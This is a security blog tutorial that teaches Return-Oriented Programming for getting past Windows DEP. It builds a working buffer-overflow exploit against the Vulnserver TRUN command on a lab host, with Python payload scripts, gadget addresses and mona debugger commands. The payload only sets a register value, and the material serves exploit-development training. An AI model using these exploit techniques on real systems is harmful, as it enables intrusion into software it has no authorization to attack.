---
slug: bypassing-dep/
title: Bypassing DEP with ROP
date: 2020-08-24
category: attacks
subtitle: Running instructions by reference
tags: osee, training, exploit
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330681/blog/bypassing-dep/cover_lrfinv.webp
alt: Photo by Michael Dziedzic on Unsplash
description: This post will show how bypass the Data Execution Prevention
  security mechanism using Return-Oriented Programming.
keywords: Business, Information, Security, Protection, Hacking, Exploit,
  OSEE, Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCE, OSCP, CHFI
about2: We don't need the key, we'll break in, RATM
source: https://unsplash.com/photos/pM9pkc9J918
---

In the [last blog entry](../understanding-dep/), we made an introduction
to what `DEP` (Data Execution Protection) is and how it affected common
buffer overflow exploits.

In this post, we’ll show a way to bypass `DEP` using Return-Oriented
Programming (`ROP`).

## ROP

When we’re writing an exploit to a buffer overflow vulnerability on an
application without `DEP`, we overwrite the saved instruction pointer on
the stack frame of the affected function with a pointer to something
like `JMP ESP` (or any other register pointing to our shellcode). We
then place a shellcode on the stack, which is finally executed when the
`JMP ESP` is performed.

When we perform a `JMP ESP` (or any other general-purpose register), the
program expects to find **instructions** in the address pointed to
`ESP`. With `DEP`, we can’t execute instructions on the stack, but we
still control the execution flow.

What would happen if, instead of overwriting the `Saved EIP` with a
pointer to `JMP ESP`, we overwrite it with a pointer to a `RETN`
instruction? The `RETN` instruction is commonly used in the function
epilogues and will make one thing: Pop the value pointed by `ESP` and
use it as the next instruction pointer or `EIP`. In other words, `RETN`
expects to find in the address pointed to `ESP`, a **pointer to an
instruction**, not an **instruction** itself.

As we control the execution flow and write on the stack, we can do
whatever we want. Let’s find a `RETN` instruction:

``` bash
!mona find -type instr -s "retn" -p 10 -o
```

This will tell `mona` to find up to 10 `RETN` instructions. The result
is:

<div class="imgblock">

![RETN instructions](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330678/blog/bypassing-dep/retn1_gtil26.webp)

</div>

Let’s take the first one at `62501022` and update the exploit of the
[previous post](../understanding-dep/). This time we want to make `EAX`
have the value `0xdeadbeef`:

``` python
#!/usr/bin/env python3
#
## Bypass DEP

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    b'\x31\xc0' +                   # xor eax,eax
    b'\x05\xee\xbe\xad\xde' +       # add eax,0xdeadbeee
    b'\x40' +                       # inc eax. Now eax=0xdeadbeef
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And see what happens:

<div class="imgblock">

![RETN](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330677/blog/bypassing-dep/rop1_z13yrk.gif)

</div>

Here’s what happened:

1. We put a breakpoint at the address of the `RETN` instruction.

2. We executed the exploit.

3. The breakpoint was hit.

4. When it hits, look at the value pointed by `ESP`: `EE05C031`.

5. That value is part of the shellcode injected:

    1. `xor eax,eax` → `\x31\xc0`

    2. `add eax,0xdeadbeee` → `\x05\xee\xbe\xad\xde` (the first two
        bytes)

6. When the `RETN` instruction is executed, that value `EE05C031` is
    stored on `EIP`.

What it means is that we can replace the `EE05C031` bytes with an
arbitrary pointer that will become the next instruction to be executed\!

In our exploit, we want to make `EAX` = `0xdeadbeef` using three
instructions: `xor eax,eax`, `add eax,0xdeadbeee` and `inc eax`. Let’s
check if we can find a pointer in the execution environment that
performs the first (`xor eax,eax`) operation:

<div class="imgblock">

![RETN](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330677/blog/bypassing-dep/find1_it5idv.gif)

</div>

We could find one at `62501162` that points to a `xor eax,eax`. Let’s
update our exploit and place that address instead of the `xor eax,eax`
instruction:

``` python
#!/usr/bin/env python3
#
# Bypass DEP

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    # 62501162  |.  31C0                  XOR EAX,EAX
    struct.pack('<L', 0x62501162) +
    b'\x05\xee\xbe\xad\xde' +       # add eax,0xdeadbeee
    b'\x40' +                       # inc eax. Now eax=0xdeadbeef
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Run it:

<div class="imgblock">

![ROP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330677/blog/bypassing-dep/rop2_aacijn.gif)

</div>

Wonderful\! Here’s what happened:

1. The pointer to the `RETN` instruction was reached.

2. When the `RETN` ran, it retrieved the value pointed by `ESP` and
    updated `EIP` with that.

3. In our case, that value was a pointer to a `xor eax,eax`
    instruction.

4. With that, the `xor eax,eax` was successfully executed\! We bypassed
    DEP\!

However, there’s a problem. If you look at the animation, the execution
flow was diverted to where the `xor eax,eax` instruction was placed, but
then we lost control.

We need to make `EAX = 0xdeadbeee`. There’re several ways to do that. We
tried with `xor eax,eax → add eax,0xdeadbeee` but another way to do it
is to place the value `0xdeadbeee` on top of the stack and then perform
a `pop eax`. We also need to regain control of the execution flow. This
can be done by returning to the stack, so we can execute the last
instruction on our shellcode `inc eax` and make `EAX = 0xdeadbeef`. That
means that we need to find an address to a `pop eax` instruction
followed by a `retn`.

<div class="imgblock">

![POP EAX](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330677/blog/bypassing-dep/popeax1_ikidee.gif)

</div>

We found it at `625011B4`\! Now, do you see why this is called `ROP`?
It’s because we always need to return back to the stack to fetch the
next pointer to our next desired instruction. For the record, any
instruction or set of instructions followed by a `retn` is called a
**Gadget** in `ROP` terms.

Our `pop eax # retn` gadget relies on the stack having the value
`0xdeadbeee` on the top. Let’s update our exploit:

``` python
#!/usr/bin/env python3
#
# Bypass DEP

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    # 625011B4   .  58                    POP EAX
    # 625011B5   .  C3                    RETN
    struct.pack('<L', 0x625011B4) +
    # Value that will be retrieved by POP EAX
    struct.pack('<L', 0xdeadbeee) +
    b'\x40' +                       # inc eax. Now eax=0xdeadbeef
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Check it:

<div class="imgblock">

![POP EAX](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330678/blog/bypassing-dep/popeax2_has6yi.gif)

</div>

We were able to make `EAX = 0xdeadbeee` using `ROP`. Now, the final step
is to find an `inc eax` pointer to make `EAX = 0xdeadbeef`.

<div class="imgblock">

![INC EAX](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330678/blog/bypassing-dep/inceax_zeq83l.webp)

</div>

We found one at `00402139`. As this is the last instruction of our
shellcode, the NULL byte won’t affect the exploit. Let’s update the
code:

``` python
#!/usr/bin/env python3
#
# Bypass DEP

import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'TRUN .' +
    b'A' * 2006 +
    # 62501022  \.  C3                    RETN
    struct.pack('<L', 0x62501022) +
    # 625011B4   .  58                    POP EAX
    # 625011B5   .  C3                    RETN
    struct.pack('<L', 0x625011B4) +
    # Value that will be retrieved by POP EAX
    struct.pack('<L', 0xdeadbeee) +
    # 00402139   .  40                    INC EAX
    struct.pack('<L', 0x00402139) +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Check it:

<div class="imgblock">

![ROP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330680/blog/bypassing-dep/rop3_gkn3oz.gif)

</div>

We were able to make `EAX = 0xdeadbeef` without executing a single
instruction on the stack\! We’ve bypassed `DEP`\!

## Using mona to find gadgets

You may notice by now that finding useful gadgets could become something
really tedious. Fortunately for us, `mona` has made this task easy. You
just need to issue the following:

``` bash
!mona rop
```

And wait for `mona` to do the hard work:

<div class="imgblock">

![Mona ROP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330687/blog/bypassing-dep/mona1_wj7c6p.gif)

</div>

With that, `mona` will find usable gadgets on the execution environment.
A file called `rop.txt` is placed on the `mona` directory of the
debuggee application containing all the gadgets found. `mona` also
generates a proposal of something called `ROP chains`, which is nothing
but a set of ROP gadgets chained together to perform something more
complex. I won’t spoil the next post, but ROP chains will be used later
in a more [serious exploitation](../vulnserver-trun-rop/).

## Conclusions

Here we could see a way to bypass the Data Execution Protection on a
modern Windows system. However, the shellcode used was very basic and
only demonstrated that `DEP` could be bypassed. We’ll use ROP to create
something more complex in the [next post](../vulnserver-trun-rop/).
